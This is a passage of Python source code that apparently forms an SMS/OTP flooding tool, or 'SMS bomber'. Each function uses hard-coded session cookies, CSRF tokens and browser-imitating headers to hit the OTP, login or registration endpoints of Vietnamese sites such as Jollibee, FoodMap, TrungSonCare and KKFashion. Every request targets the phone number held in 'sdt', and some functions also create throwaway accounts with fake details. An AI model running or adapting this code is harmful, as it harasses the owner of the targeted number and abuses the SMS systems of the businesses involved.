        'fleetcart_session': 'eyJpdiI6IjIyaFBzU3lmQVM1VkltdU5ReWw5cnc9PSIsInZhbHVlIjoiR3NXMUJzV0ZiMWFHdm5FZ3lRUnJzazN5RW1taTRsclFmMG5SYTlaZ0dWVE9td01aZTBQdTdNQURUbElMTStUSiIsIm1hYyI6IjM3ODJmOTI0ZDcxNDAzNTZmM2UwOTM4OTUxZTRmNjc1MGQ1YTRkOTAxNjJlNjY3Nzc2YTI3MmYyMDUxMmJiMGUifQ%3D%3D',
        'getLocationPickUp': 'eyJpdiI6IjNNWG9RVUszTTZMbnFVUGNGWVh4Mmc9PSIsInZhbHVlIjoienY2UER5M2FBbTJvdnpTRFwvMDBiVlE9PSIsIm1hYyI6ImJjNjg1MWQxNzZlZGZhZTdmNmE2MmY1ZTk4M2Y0OWI2OWU1ODYxZDU4YjVlMDdlN2JkNDljOTUzOGQwNWZjYTEifQ%3D%3D',
        '_qg_fts': '1730012913',
        'QGUserId': '3560813477745070',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Cookie': 'visitedGroupIds=eyJpdiI6IlF2YXMydzlrWUxqMW9kVjNsZGY5S3c9PSIsInZhbHVlIjoiREFLdkNGZjJmKyt1NWJQOXVST2tCQT09IiwibWFjIjoiOTlmYmM1NmU0NTc2MGRmOGU0YjRkNWE1ZWRlODg4MDc4OTkyYzhjNGQ5YmU4MTYzMzdmM2IyYTUzYWMxOTU4NCJ9; XSRF-TOKEN=eyJpdiI6IlM0M1loNGQzc1RnODdPUVZLR3J0cFE9PSIsInZhbHVlIjoidnJJYUY2eUQyQm9zbWNZMDRaWFpDTUVVRDZXeXh1QUNTeEk4MGliODFsSnlPSEluVWlVbzFUa0NuaGhub25UayIsIm1hYyI6ImIzMGY3YTc1ODIxNDBjZDRiZThiMTc0MDEzNDY3Zjg5YzU2YjgzNjJkMTRhYzEyYTdmYTljYjA1NjAzZjY0MzEifQ%3D%3D; fleetcart_session=eyJpdiI6IjIyaFBzU3lmQVM1VkltdU5ReWw5cnc9PSIsInZhbHVlIjoiR3NXMUJzV0ZiMWFHdm5FZ3lRUnJzazN5RW1taTRsclFmMG5SYTlaZ0dWVE9td01aZTBQdTdNQURUbElMTStUSiIsIm1hYyI6IjM3ODJmOTI0ZDcxNDAzNTZmM2UwOTM4OTUxZTRmNjc1MGQ1YTRkOTAxNjJlNjY3Nzc2YTI3MmYyMDUxMmJiMGUifQ%3D%3D; getLocationPickUp=eyJpdiI6IjNNWG9RVUszTTZMbnFVUGNGWVh4Mmc9PSIsInZhbHVlIjoienY2UER5M2FBbTJvdnpTRFwvMDBiVlE9PSIsIm1hYyI6ImJjNjg1MWQxNzZlZGZhZTdmNmE2MmY1ZTk4M2Y0OWI2OWU1ODYxZDU4YjVlMDdlN2JkNDljOTUzOGQwNWZjYTEifQ%3D%3D; _qg_fts=1730012913; QGUserId=3560813477745070; _qg_pushrequest=true; _qg_cm=1',
        'Referer': 'https://foodmap.asia/product/dau-an-dau-nanh-tuong-an',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-CSRF-TOKEN': 'XSLZxyTJLFDN5aXM4XoAE9itFhUuxg4IOzptkQRx',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response = requests.get(
            f'https://foodmap.asia/register/otp/resend-otp/{sdt}/null/true/sms',
            cookies=cookies,
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FOODMAPSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FOODMAPSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def foodmapzl():
    cookies = {
        'visitedGroupIds': 'eyJpdiI6IlF2YXMydzlrWUxqMW9kVjNsZGY5S3c9PSIsInZhbHVlIjoiREFLdkNGZjJmKyt1NWJQOXVST2tCQT09IiwibWFjIjoiOTlmYmM1NmU0NTc2MGRmOGU0YjRkNWE1ZWRlODg4MDc4OTkyYzhjNGQ5YmU4MTYzMzdmM2IyYTUzYWMxOTU4NCJ9',
        'getLocationPickUp': 'eyJpdiI6IjNNWG9RVUszTTZMbnFVUGNGWVh4Mmc9PSIsInZhbHVlIjoienY2UER5M2FBbTJvdnpTRFwvMDBiVlE9PSIsIm1hYyI6ImJjNjg1MWQxNzZlZGZhZTdmNmE2MmY1ZTk4M2Y0OWI2OWU1ODYxZDU4YjVlMDdlN2JkNDljOTUzOGQwNWZjYTEifQ%3D%3D',
        '_qg_fts': '1730012913',
        'QGUserId': '3560813477745070',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'XSRF-TOKEN': 'eyJpdiI6IjFQQTloeFhIU0FJMWd5U0VUT1FRUnc9PSIsInZhbHVlIjoiT0JxRDdjTlZLWXk5WFI1MWdxKzFIM3V2YVAzKytHb216YWwyQ1ZzdVFmY2QxTWp3dXNHRzJMYzFBMmJONk1tMCIsIm1hYyI6Ijc0ZDkxZjVmMmYyMGY2MGMzMjRmOTZlNGYwYzQ1OGQ4MTYxMzgwYzY3OThjYzBhN2IxMzdiZDRmZjc0MTNmNjYifQ%3D%3D',
        'fleetcart_session': 'eyJpdiI6Ikp6OW9pVXMxVEgrRUljU1lYZ08yRHc9PSIsInZhbHVlIjoib0tpaDBRTTlnZjA1ZUplalVCV3JZRDZ6Q2JPNzZZVnE2dVlBMmU0bXpabTVndlNZZkIralN3MGJpcXk2RndzVyIsIm1hYyI6ImM3ZWYxNzgwNGM5ZDZmODJjZDcxZDY5ZjQ5MzY3MjExMmM5YTliYTI1N2JmNGQxMzcxY2M5MjkxMWMxMDFmYzUifQ%3D%3D',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        # 'Cookie': 'visitedGroupIds=eyJpdiI6IlF2YXMydzlrWUxqMW9kVjNsZGY5S3c9PSIsInZhbHVlIjoiREFLdkNGZjJmKyt1NWJQOXVST2tCQT09IiwibWFjIjoiOTlmYmM1NmU0NTc2MGRmOGU0YjRkNWE1ZWRlODg4MDc4OTkyYzhjNGQ5YmU4MTYzMzdmM2IyYTUzYWMxOTU4NCJ9; getLocationPickUp=eyJpdiI6IjNNWG9RVUszTTZMbnFVUGNGWVh4Mmc9PSIsInZhbHVlIjoienY2UER5M2FBbTJvdnpTRFwvMDBiVlE9PSIsIm1hYyI6ImJjNjg1MWQxNzZlZGZhZTdmNmE2MmY1ZTk4M2Y0OWI2OWU1ODYxZDU4YjVlMDdlN2JkNDljOTUzOGQwNWZjYTEifQ%3D%3D; _qg_fts=1730012913; QGUserId=3560813477745070; _qg_pushrequest=true; _qg_cm=1; XSRF-TOKEN=eyJpdiI6ImJ2dUF1d0p3anNuTlwvTU95OXk4YkRBPT0iLCJ2YWx1ZSI6ImVqZ09KVncreVF1RVhHZkg3T1FPcE91MVRDZE1PaFJxb1FPbmQ3M3B2WU5lZFZWODU3NlpHbUpvUFF4cnhTOEkiLCJtYWMiOiI2YmEyYTY2N2RkODc3Yzg4MTBiNTA1NTk4MjdjYzdhMTQ1YWFlMGFiMTVhMjM3Y2FkMjQ5Y2NhOGYyZjNmZTI2In0%3D; fleetcart_session=eyJpdiI6IkxVR3Nkem5UYnRYd1F2N1ZnWmEzXC9BPT0iLCJ2YWx1ZSI6IkthVWpuYUpMYmcwZVZ0UTJhelNiaStuQTVlSHRuWVRyb1Jxb3htTFRZdWluR05mTENlYXlIb0o5MzMxRXVncHEiLCJtYWMiOiI3YWVjNGUzNjU3MTkwMTY5YmM4OTlkZTZjY2NjNWZiZjgxOTFhMzg4NmIzYzU2ZmYwOGViZGM0N2I1NjJkZWI2In0%3D',
        'Origin': 'https://foodmap.asia',
        'Referer': 'https://foodmap.asia/password/reset',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-CSRF-TOKEN': 'XSLZxyTJLFDN5aXM4XoAE9itFhUuxg4IOzptkQRx',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response = requests.post(f'https://foodmap.asia/register/step-1/{sdt}/null/1', cookies=cookies, headers=headers)
        print("FOODMAPZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FOODMAPZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def trungsoncarezl():
    cookies = {
        'popNewLogin': '0',
        'sid_customer_s_558c5': '2c6597c4decf004b58a4b188d65efafd-1-C',
        'checkacc': '0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'popNewLogin=0; sid_customer_s_558c5=2c6597c4decf004b58a4b188d65efafd-1-C; checkacc=0',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dorders.search',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'zalo',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': sdt,
        'security_hash': '2e95aca90d025bc949785961ba432043',
    }

    try:
        response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TRUNGSONCAREZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUNGSONCAREZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def trungsoncaresms():
    cookies = {
        'popNewLogin': '0',
        'sid_customer_s_558c5': '2c6597c4decf004b58a4b188d65efafd-1-C',
        'checkacc': '0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'popNewLogin=0; sid_customer_s_558c5=2c6597c4decf004b58a4b188d65efafd-1-C; checkacc=0',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dprofiles.update',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'sms',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': sdt,
        'security_hash': '2e95aca90d025bc949785961ba432043',
    }

    try:
        response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TRUNGSONCARESMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUNGSONCARESMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def jollibee():
    cookies = {
        'csp': '2',
        'csd': '41',
        'PHPSESSID': '5k1qska2bqhc23a4r3p9km8jil',
        'form_key': 'MecPFiTkWMSnWwXK',
        'form_key': 'MecPFiTkWMSnWwXK',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'private_content_version': 'e2459d6d59da3a8e9405f93a7c02a85b',
        'section_data_ids': '%7B%22amfacebook-pixel%22%3A1731816340%2C%22notification_count%22%3A1731816340%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1731816340%2C%22customer%22%3A1731816328%2C%22compare-products%22%3A1731816328%2C%22last-ordered-items%22%3A1731816328%2C%22cart%22%3A1731816328%2C%22directory-data%22%3A1731816328%2C%22captcha%22%3A1731816328%2C%22instant-purchase%22%3A1731816328%2C%22loggedAsCustomer%22%3A1731816328%2C%22persistent%22%3A1731816328%2C%22review%22%3A1731816328%2C%22wishlist%22%3A1731816328%2C%22ammessages%22%3A1731816328%2C%22product_area_price%22%3A1731816328%2C%22customer_voucher%22%3A1731816328%2C%22recently_viewed_product%22%3A1731816328%2C%22recently_compared_product%22%3A1731816328%2C%22product_data_storage%22%3A1731816328%2C%22paypal-billing-agreement%22%3A1731816328%2C%22messages%22%3Anull%7D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'csp=2; csd=41; PHPSESSID=5k1qska2bqhc23a4r3p9km8jil; form_key=MecPFiTkWMSnWwXK; form_key=MecPFiTkWMSnWwXK; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=e2459d6d59da3a8e9405f93a7c02a85b; section_data_ids=%7B%22amfacebook-pixel%22%3A1731816340%2C%22notification_count%22%3A1731816340%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1731816340%2C%22customer%22%3A1731816328%2C%22compare-products%22%3A1731816328%2C%22last-ordered-items%22%3A1731816328%2C%22cart%22%3A1731816328%2C%22directory-data%22%3A1731816328%2C%22captcha%22%3A1731816328%2C%22instant-purchase%22%3A1731816328%2C%22loggedAsCustomer%22%3A1731816328%2C%22persistent%22%3A1731816328%2C%22review%22%3A1731816328%2C%22wishlist%22%3A1731816328%2C%22ammessages%22%3A1731816328%2C%22product_area_price%22%3A1731816328%2C%22customer_voucher%22%3A1731816328%2C%22recently_viewed_product%22%3A1731816328%2C%22recently_compared_product%22%3A1731816328%2C%22product_data_storage%22%3A1731816328%2C%22paypal-billing-agreement%22%3A1731816328%2C%22messages%22%3Anull%7D',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0MjA2MDQiLCJhcCI6IjEzODU5MjEyNzYiLCJpZCI6IjI5MjAxMWMzZGFmMmE3ZTYiLCJ0ciI6IjlhNDY5MjgzMzUzZTc4NjExYTAyNThmNzAyYzdlN2NhIiwidGkiOjE3MzE4MTUzNjI0MDZ9fQ==',
        'origin': 'https://jollibee.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://jollibee.com.vn/customer/account/create',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-9a469283353e78611a0258f702c7e7ca-292011c3daf2a7e6-01',
        'tracestate': '3420604@nr=0-1-3420604-1385921276-292011c3daf2a7e6----1731815362406',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-newrelic-id': 'VwIFUVBTDBABV1FaDwAOUFUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'form_key': 'MecPFiTkWMSnWwXK',
        'success_url': '',
        'error_url': '',
        'lastname': 'trabn',
        'firstname': 'dat',
        'phone': sdt,
        'email': 'fasfsaasf@gmail.com',
        'password': '123123aA@',
        'password_confirmation': '123123aA@',
        'dob': '13/11/1997',
        'gender': '1',
        'province_customer': '19',
        'agreement': '1',
        'otp_type': 'create',
        'ip': '171.224.181.204',
    }

    try:
        response = requests.post('https://jollibee.com.vn/otp/action/getOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("JOLLIBEE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("JOLLIBEE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def beautyfull():
    cookies = {
        'VisitorId': 'ea48350dbb139a244ec839238688dee8',
        'sg__utmv': '%2Fdau-goi%2Fsua-tam-romano',
        '_ssid': 'r3p2x4423udgbhxrrmfrlgon',
        '__RequestVerificationToken': 'kl-2eB8QiL2e7XI6TH-0mcBGYDxbBRxNX6mTmmmqydoUSvox7ZwS0FqNU6yW0YbhaoZcwmB99zrcuskzfubLpngzSECbsemmKAeZPMzdltc1',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'VisitorId=ea48350dbb139a244ec839238688dee8; sg__utmv=%2Fdau-goi%2Fsua-tam-romano; _ssid=r3p2x4423udgbhxrrmfrlgon; __RequestVerificationToken=kl-2eB8QiL2e7XI6TH-0mcBGYDxbBRxNX6mTmmmqydoUSvox7ZwS0FqNU6yW0YbhaoZcwmB99zrcuskzfubLpngzSECbsemmKAeZPMzdltc1',
        'origin': 'https://www.beautyfulls.com',
        'priority': 'u=0, i',
        'referer': 'https://www.beautyfulls.com/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    data = {
        '__RequestVerificationToken': 'sn2sHkt57ijUoroGPL75hcgzcH2ZmlxcBurVkQLyOBwZ7BYcFTAPSJfQdk6oWEPkdouMzLce--Kr1Fh1NnIAeIm-JNWiBHuW_SZopsUcY5o1',
        'RememberMe': 'true',
        'returnUrl': '/',
        'PhoneNumber': sdt,
    }

    try:
        response = requests.post('https://www.beautyfulls.com/vi/account/login-otp/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEAUTYFULL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEAUTYFULL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vsports():
    cookies = {
        'G_ENABLED_IDPS': 'google',
        '__stripe_mid': '644e0998-9a06-4949-b190-a072af8f75832ddeb0',
        '__stripe_sid': '65962f02-bb01-46bb-83a6-9c35550e31fd79054f',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwibmFtZSI6IkFub255bW91cyIsImF2YXRhciI6IiIsInR5cGUiOiJhbm9ueW1vdXMiLCJsYW5ndWFnZV9pZCI6ImVuIiwiaWF0IjoxNjUzMzQwOTE5fQ.9BMudg88cBjqhLzB1BAvg7SKgm1cSEbV04leVW-ety8',
        'content-type': 'application/json',
        # 'cookie': 'G_ENABLED_IDPS=google; __stripe_mid=644e0998-9a06-4949-b190-a072af8f75832ddeb0; __stripe_sid=65962f02-bb01-46bb-83a6-9c35550e31fd79054f',
        'origin': 'https://vsports.vn',
        'priority': 'u=1, i',
        'referer': 'https://vsports.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    params = {
        'k': '71287e28303b3d393b323b33333b383a333977',
        'lang': 'vi',
    }

    json_data = {
        'email': sdt,
    }

    response = requests.post(
        'https://vsports.vn/api/v1/users/verify/send',
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

def mrtho():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://www.mrtho.vn',
        'Referer': 'https://www.mrtho.vn/customer/signin',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    try:
        response = requests.post('https://www.mrtho.vn/api/sms/sendsms', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MRTHO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MRTHO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def kkfashion():
    cookies = {
        'jpresta_cache_context': 'e67fa49f-162d-11ee-9cf4-0692000019e5',
        '_qg_fts': '1721578581',
        'QGUserId': '1896938940101377',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'PrestaShop-7cbf831598fa6791cd6d07d5b5873d26': 'def502007b8c8eb61736105deec2c85b445e6b2b827b1c9881ead4a1ec5871091282a04d8ff5014f99895733add04bfa3275048c602279d788847264d33d990cebe62d9a15000217ffdd531574e2cdc2848c276e0739404447439d8ce193208fe23a7ec6d710571ea52c1105a2d4d7ee79614b41e1b48de782c3410d1f20ac399f7a0922ff7e5643597bb8cde4bee8dc764d41bec75afe39a9c71c942627ed995e9f5bddc231678f21cf69365f0cf548bc67a888ef420102a0b233c45ed78b2d262d36518dc78b61f6eff594c9e2af4b11e3f25edd',
        'PHPSESSID': 'd6e6f38ea2j2tf3m264h26599v',
        'PrestaShop-03bfe1c20f5691800e1f882876466fe7': 'def50200a1276f3d7b88be6bf9b7363cc6a59f6ba6b1453cb3b46c0633940c04a97756272df36d87542e8a27e57038d4b7936ffed9c1e753d9ee9a30effd837ab2846cf4d3a67fd12c07b04e5aa5c8aaf0be9f8aeecf4c685c42eb85987277010284ddcad86163c8ee6cb7ff98c89909d3de555a7f7fdc5bdbdd9c31bd8882e2dcb962799979fdab88a49b719d3cdaef4617f0c7c735099ae76dd72c8afaa66ce54698d12810f5d9cae8add5a54fc79cab7aaa016f23fb78ac404c03a9ce81a78abaa2cf793ff38929e312c6182028b27dc77105c3c0d5022c5ba4674d25b3a11982034a8080d39601ad371dd8ec95fab4e776f1688c25428aee70f107ce7693a30156b6993e7a777e528a68c86c822cc375ccfa629cf58990ed',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'jpresta_cache_context=e67fa49f-162d-11ee-9cf4-0692000019e5; _qg_fts=1721578581; QGUserId=1896938940101377; _qg_pushrequest=true; _qg_cm=1; PrestaShop-7cbf831598fa6791cd6d07d5b5873d26=def502007b8c8eb61736105deec2c85b445e6b2b827b1c9881ead4a1ec5871091282a04d8ff5014f99895733add04bfa3275048c602279d788847264d33d990cebe62d9a15000217ffdd531574e2cdc2848c276e0739404447439d8ce193208fe23a7ec6d710571ea52c1105a2d4d7ee79614b41e1b48de782c3410d1f20ac399f7a0922ff7e5643597bb8cde4bee8dc764d41bec75afe39a9c71c942627ed995e9f5bddc231678f21cf69365f0cf548bc67a888ef420102a0b233c45ed78b2d262d36518dc78b61f6eff594c9e2af4b11e3f25edd; PHPSESSID=d6e6f38ea2j2tf3m264h26599v; PrestaShop-03bfe1c20f5691800e1f882876466fe7=def50200a1276f3d7b88be6bf9b7363cc6a59f6ba6b1453cb3b46c0633940c04a97756272df36d87542e8a27e57038d4b7936ffed9c1e753d9ee9a30effd837ab2846cf4d3a67fd12c07b04e5aa5c8aaf0be9f8aeecf4c685c42eb85987277010284ddcad86163c8ee6cb7ff98c89909d3de555a7f7fdc5bdbdd9c31bd8882e2dcb962799979fdab88a49b719d3cdaef4617f0c7c735099ae76dd72c8afaa66ce54698d12810f5d9cae8add5a54fc79cab7aaa016f23fb78ac404c03a9ce81a78abaa2cf793ff38929e312c6182028b27dc77105c3c0d5022c5ba4674d25b3a11982034a8080d39601ad371dd8ec95fab4e776f1688c25428aee70f107ce7693a30156b6993e7a777e528a68c86c822cc375ccfa629cf58990ed',
        'origin': 'https://www.kkfashion.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.kkfashion.vn/dang-nhap?create_account=1',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    params = {
        'create_account': '1',
    }

    data = {
        'username': 'tran dat',
        'phone': sdt,
        'email': random_email,
        'password': '123123aA@',
        'city': 'Thành phố Cần Thơ',
        'district': 'Huyện Cờ Đỏ',
        'ward': 'Thới Xuân',
        'address2': 'Thới Xuân - Huyện Cờ Đỏ',
        'address1': '22 tan te3 ',
        'submitCreate': '1',
    }

    response = requests.post('https://www.kkfashion.vn/dang-nhap', params=params, cookies=cookies, headers=headers, data=data)

    cookies = {
        '_qg_fts': '1721578581',
        'QGUserId': '1896938940101377',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'PHPSESSID': 'd6e6f38ea2j2tf3m264h26599v',
        'jpresta_cache_source_6666cd76f96956469e7be39d750cc7d9': '2',
